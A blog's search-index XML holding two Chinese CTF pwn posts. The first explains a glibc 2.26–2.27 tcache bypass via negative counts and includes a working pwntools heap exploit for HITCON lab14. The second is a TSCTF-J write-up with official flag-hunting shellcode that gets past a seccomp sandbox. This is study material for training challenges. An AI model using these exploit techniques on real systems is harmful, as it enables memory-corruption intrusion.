<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Tcache机制绕过</title>
      <link href="/2022/11/10/tcache-ji-zhi-rao-guo/"/>
      <url>/2022/11/10/tcache-ji-zhi-rao-guo/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>Tcache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术，目的是提升堆管理的性能。<br>对攻击者而言,Tcache的不安全机制为攻击者带来了大量新的漏洞利用方式，但同时也使先前的一些利用方法(如Unsortedbin Attak)等漏洞利用减弱甚至失效，并且在一些题中Tcache的利用会相当麻烦。故本文探究Tcache机制的绕过方法(glibc2.26-2.27)</p><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><h2 id="1-分配大小不在Tcache范围内的堆块"><a href="#1-分配大小不在Tcache范围内的堆块" class="headerlink" title="1.分配大小不在Tcache范围内的堆块"></a>1.分配大小不在Tcache范围内的堆块</h2><p>好像说了句废话，不过在某些题中还是有用的.<br>Tcache的chunk范围在0x410(1032)字节以内</p><h2 id="2-填满Tcache"><a href="#2-填满Tcache" class="headerlink" title="2.填满Tcache"></a>2.填满Tcache</h2><p>好像也是句废话<br>free某个tcache超过7次，也就是将存放在tcache结构体中的该范围bins的数量占满，后续free的堆块就会放到相应的bin中</p><h2 id="3-修改Tcache结构体中的counts域"><a href="#3-修改Tcache结构体中的counts域" class="headerlink" title="3.修改Tcache结构体中的counts域"></a>3.修改Tcache结构体中的counts域</h2><p>所谓的绕过Tcache机制，无非就是使释放的堆块不进入Tcache中，分配的堆块不从Tcache中取出.</p><h3 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h3><p>如果我们想让释放的堆块不进入Tcache中，就需要对应Tcache bin的counts域不小于tcache_count(默认为7)，即Tcache已满.但如过counts域不为0，在分配堆块时就一定会从Tcache中取出,前后两个发生冲突.</p><h3 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h3><p>下面是tcache_put的调用过程</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">USE_TCACHE</span></span>      <span class="token comment">/* Fill cache first, return to user only if cache fills. We may return one of these chunks later.  */</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>tcache_nb  <span class="token operator">&amp;&amp;</span> tcache<span class="token operator">-&gt;</span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_count<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">tcache_put</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>  return_cached <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">}</span>      <span class="token keyword">else</span><span class="token punctuation">{</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>              <span class="token function">check_malloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> p<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">USE_TCACHE</span></span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重点关注这一条件判断，如果我们能绕过这一判断进入else，就能实现绕过Tcache机制进行堆块分配</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>tcache_nb  <span class="token operator">&amp;&amp;</span> tcache<span class="token operator">-&gt;</span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_count<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>于是我们便在源码中寻找各变量的定义<br>tcache_perthread_struct结构体中定义了char 类型的counts数组</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">tcache_perthread_struct</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> counts<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span>  tcache_entry <span class="token operator">*</span>entries<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> tcache_perthread_struct<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>glibc中并没有给出mp_.tcache_count的类型定义，不过我们可通过这一赋值操作推出mp_.tcache_count是size_t类型，而size_t在大部分机器上是无符号整型</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">do_set_tcache_count</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> value<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">LIBC_PROBE</span> <span class="token punctuation">(</span>memory_tunable_tcache_count<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> mp_<span class="token punctuation">.</span>tcache_count<span class="token punctuation">)</span><span class="token punctuation">;</span>  mp_<span class="token punctuation">.</span>tcache_count <span class="token operator">=</span> value<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>于是counts是char类型，mp_.tcache_count是size_t类型，在比较时会发生整型提升，故若能使counts为一个负数，便可绕过这一判断<br>那有没有办法使counts变为一个负数呢？答案是有，可以通过整数溢出做到<br>在tcache_get中存在对counts域的–操作，于是只要从Tcache中分配出的chunk数量大于释放进Tcache的数量，便可使counts变为一个负数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">tcache_get</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">{</span>  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-&gt;</span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tcache<span class="token operator">-&gt;</span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  tcache<span class="token operator">-&gt;</span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>  <span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-&gt;</span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于上述操作，可以通过Tcache Poisoning技术做到(即伪造一个Tcache中的chunk,且由于Tcache分配时无对size域的检查,使这一操作能够轻松完成)<br>到此我们便完成了Tcache机制的绕过</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>这一绕过方法得益于glibc2.26-2.27中tcache_get函数的错误assert操作</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">tcache_get</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">{</span>  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-&gt;</span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//第二个断言的内容是错误的，本意应该是检查counts的符号</span>  <span class="token comment">//即assert(tcache-&gt;counts[tc_idx]&gt;0);</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tcache<span class="token operator">-&gt;</span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  tcache<span class="token operator">-&gt;</span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>  <span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-&gt;</span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一漏洞已在glibc2.28后的版本中修复</p><h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p>看起来感觉挺鸡肋，但是大多数题目会限制分配堆块的大小和数量，此时前两个绕过方法便已失效,这一方法便有了用武之地</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>还是以Unsortedbin Attack的经典题hitcontraining_lab14为例</p><h4 id="HITCON-Training-lab14-magic-heap"><a href="#HITCON-Training-lab14-magic-heap" class="headerlink" title="HITCON Training lab14 magic heap"></a>HITCON Training lab14 magic heap</h4><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><ol><li>题目中edit_heap函数没有对size的限制存在堆溢出<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/HITCON%20Training%20lab14%20magic%20heap2.png"></li><li>若bss段变量magic&gt;4869即可执行后门函数<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/HITCON%20Training%20lab14%20magic%20heap1.png"><br>所以就是Unsortedbin Attack修改magic的值</li></ol><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./magicheap'</span><span class="token punctuation">)</span>magic_addr <span class="token operator">=</span> <span class="token number">0x6020C0</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">magic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'4869'</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>tcache_poisoning <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x602200</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>tcache_poisoning<span class="token punctuation">)</span><span class="token punctuation">,</span>tcache_poisoning<span class="token punctuation">)</span>  create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#此时Tcache的counts域已为-1，完成绕过</span>  create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span> <span class="token comment"># 防止与top chunk合并</span><span class="token comment">#Unsortedbin Attack</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>magic_addr<span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span> magic<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>文中提出的这一绕过方法利用价值不大，但这也是我第一次通过源码来分析问题，还是有一点纪念意义的<br>我倒是希望在以后的做题中能有这一绕过方法的用武之地吧</p>]]></content>
      
      
      <categories>
          
          <category> 探究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022TSCTF-J</title>
      <link href="/2022/11/09/2022tsctf-j-writeup-2022.10.17/"/>
      <url>/2022/11/09/2022tsctf-j-writeup-2022.10.17/</url>
      
        <content type="html"><![CDATA[<p>[[PWN ？！]]<br>[[PWN生涯]]</p><ul><li><h3 id="–writeby-HanQi"><a href="#–writeby-HanQi" class="headerlink" title="–writeby__HanQi"></a>–writeby__HanQi</h3></li><li><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1>算是正式做的第一次比赛吧，啥也不会坐牢四天（悲<br>题目难度感觉还好(不会做都是我太菜)（比moe或hn难一点？至少pwn题是这样<br>也是第一次写wp，认真写一下留个纪念</li><li><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><ul><li><h2 id="checkin-stackoverflow"><a href="#checkin-stackoverflow" class="headerlink" title="checkin(stackoverflow)"></a>checkin(stackoverflow)</h2><ul><li><h3 id="checksec-IDA"><a href="#checksec-IDA" class="headerlink" title="checksec+IDA"></a>checksec+IDA</h3>栈溢出覆盖ch_0的值就好了</li><li><img src="https://i.niupic.com/images/2022/10/17/a9tq.png"></li><li><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><img src="https://i.niupic.com/images/2022/10/17/a9tr.png"></li></ul></li><li><h2 id="ヰ世界転生-int-overflow-ret2text"><a href="#ヰ世界転生-int-overflow-ret2text" class="headerlink" title="ヰ世界転生(int overflow+ret2text)"></a>ヰ世界転生(int overflow+ret2text)</h2><ul><li><h3 id="checksec-IDA-1"><a href="#checksec-IDA-1" class="headerlink" title="checksec+IDA"></a>checksec+IDA</h3>循环lose累积分数<br><img src="https://i.niupic.com/images/2022/10/17/a9tG.png">{:height 992, :width 776}<br>末尾有一个point_checker的函数，进去看一眼，给points设了上限，盲猜是整型溢出<br><img src="https://i.niupic.com/images/2022/10/17/a9ts.png"><br>然后是用分数换技能，前面花里胡哨没啥用（命名竟然比技能贵…<br><img src="https://i.niupic.com/images/2022/10/17/a9tt.png"><br>从有输入的地方开始看，第一次先输入长度nbytes，再第二次输入内容存到buf，对nbytes有长度限制，估计还是整型溢出<br><img src="https://i.niupic.com/images/2022/10/17/a9tH.png"><br>大概逻辑理清后来找一找后门函数或’/bin/sh’（其实一来就该找？<br><img src="https://i.niupic.com/images/2022/10/17/a9ty.png"><br>再关注一下刚刚发现的两个整形溢出点，看一下有无类型转换之类的，还真有<br><img src="https://i.niupic.com/images/2022/10/17/a9tz.png"><br><img src="https://i.niupic.com/images/2022/10/17/a9tM.png"></li><li><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><img src="https://i.niupic.com/images/2022/10/17/a9tv.png"></li></ul></li><li><h2 id="ret2shellcode-orw"><a href="#ret2shellcode-orw" class="headerlink" title="ret2shellcode(orw)"></a>ret2shellcode(orw)</h2><ul><li><h3 id="checksec-IDA-gdb"><a href="#checksec-IDA-gdb" class="headerlink" title="checksec+IDA+gdb"></a>checksec+IDA+gdb</h3>大概流程就是mmap分配一个可写可执行的空间，让你写入code并执行<br><img src="https://i.niupic.com/images/2022/10/17/a9tw.png"><br>尝试shellcraft.sh()后未成功，gdb调试发现系统调用时进程崩溃,显示“bad syscall” 搜索后发现有沙盒<br>第一次见 并在init函数里发现函数prctl 禁止了execve调用，仅允许open、read、write读取flag<br><img src="https://i.niupic.com/images/2022/10/17/a9tN.png"></li><li><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3>利用pwntools写orw的汇编，发现长度过长，只能手写<br><img src="https://i.niupic.com/images/2022/10/17/a9tx.png"><br>换成如下(其实还是网上找的code,原code还是长了,在出题人提示下删掉了重复的参数布置过程)<br><img src="https://i.niupic.com/images/2022/10/17/a9tO.png"></li></ul></li><li><h2 id="ASCII-ART-partial-overwrite"><a href="#ASCII-ART-partial-overwrite" class="headerlink" title="ASCII_ART(partial overwrite)"></a>ASCII_ART(partial overwrite)</h2><ul><li><h3 id="checksec-IDA-2"><a href="#checksec-IDA-2" class="headerlink" title="checksec+IDA"></a>checksec+IDA</h3>简洁的main函数（并不影响我看不懂<br><img src="https://i.niupic.com/images/2022/10/17/a9tw.png"><br>找找后门，有好东西<br><img src="https://i.niupic.com/images/2022/10/17/a9tQ.png"><br>gdb发现输入是可以覆盖返回地址的，再加上开了pie，那就是partial overwrite<br><img src="https://i.niupic.com/images/2022/10/17/a9tE.png"></li><li><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><img src="https://i.niupic.com/images/2022/10/17/a9tA.png"></li></ul></li><li><h2 id="Another-Checkin-Pwn-blind-fmtstr"><a href="#Another-Checkin-Pwn-blind-fmtstr" class="headerlink" title="Another_Checkin_Pwn(blind fmtstr)"></a>Another_Checkin_Pwn(blind fmtstr)</h2>没做出来，还是写一下（也不知道binary为啥没dump下来<br>没文件IDA不了了，输入字符发现回显，那就是格式化字符串盲打了，换了好多种写法，最终还是没<br>dump下来，(记住有循环…不用每次都remote)<br>还有两个没删的脚本放一放，以后再回来看为啥不行<br><img src="https://i.niupic.com/images/2022/10/17/a9tR.png"><br><img src="https://i.niupic.com/images/2022/10/17/a9tX.png"></li><li><h2 id="Easy-shellcode"><a href="#Easy-shellcode" class="headerlink" title="Easy shellcode"></a>Easy shellcode</h2>没有写出来，不过确实学到很多<ul><li><h3 id="checksec-IDA-seccomp-tools"><a href="#checksec-IDA-seccomp-tools" class="headerlink" title="checksec+IDA+seccomp-tools"></a>checksec+IDA+seccomp-tools</h3>mmap开了一块空间存入flag.txt，再mmap了一段可执行的空间写code，空间内开头的一段code是清空寄存器(还傻乎乎的asm反汇编，gdb就能看啊),后面的空间就交给我们操作。<br><img src="https://i.niupic.com/images/2022/10/17/a9tC.png"><br>重要的一点就是寄存器并没有完全清空，r15里还存有初始地址，可以通过找到text段的地址<br><img src="https://i.niupic.com/images/2022/10/17/a9tD.png"><br>找到了prctl，看一下沙盒规则,发现见过的调用全部ban掉 （其实经测试read，open，write是可以用的，但可能是参数布置的问题读到了但是没有打印出来，错失白给的机会呜呜，反馈后更新了附件）<br><img src="https://i.niupic.com/images/2022/10/17/a9tB.png"><br><img src="https://i.niupic.com/images/2022/10/17/a9tS.png"></li><li><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3>最开始的想法是既然能控制程序回到text段，那就可以重新控制参数并调用prtcl函数更改沙盒规则，多次尝试均失败（应该是不行的）<br><img src="https://i.niupic.com/images/2022/10/17/a9tF.png"><br>还有关键问题找不到buf段的位置，磨了一整天也没搞出来</li></ul></li></ul><h3 id="附上官方wp"><a href="#附上官方wp" class="headerlink" title="附上官方wp"></a>附上官方wp</h3>  <pre class="line-numbers language-python" data-language="python"><code class="language-python">sc <span class="token operator">=</span> <span class="token triple-quoted-string string">"""lea rsp, [rip+0x500]lea r13, [rip]mov r14, 0xfffffff00000 and r13, r14 # 使r13页对齐loop:add r13, 0x1000pop r14 #回收上一次push的r13地址pop r14push 0x1 #因为writev的参数是一个结构体iovec，这里的1表示iov_lenpush r13mov rdi, 2mov rsi, rspmov rdx, 1mov rcx, 0mov rax, 20syscallcmp rax, 0  #判断writev的返回值是否为负数，即该页是否可读jl loop # 若不可读再次循环mov rdi, [r13]cmp edi, 0x54435354 #判断字符串是否以TSCT开头jnz looppush 31push r13mov rdi, 2mov rsi, rspmov rdx, 1mov rcx, 0mov rax, 20syscall #打印flagjmp $"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><h3 id="question"><a href="#question" class="headerlink" title="question"></a>question</h3>  这个地方的文件描述符错误应该是2，系统调用可用writev<br><img src="https://i.niupic.com/images/2022/10/17/a9tu.png"><ul><li><h2 id="堆相关"><a href="#堆相关" class="headerlink" title="堆相关"></a>堆相关</h2>其实之前有花时间看过堆的内容，可是太多而且不好理解，看了啥也没记住，下去得好好学一下</li></ul></li></ul></li><li><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>光搁pwn坐牢了，其实web学的时间比pwn更长，结果一题没出<br>感觉pwn找资料好难，有没有啥blog分享一下<br>最后引一段从0到1的话，好好去学pwn的基础<br><img src="https://i.niupic.com/images/2022/10/17/a9tT.png"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
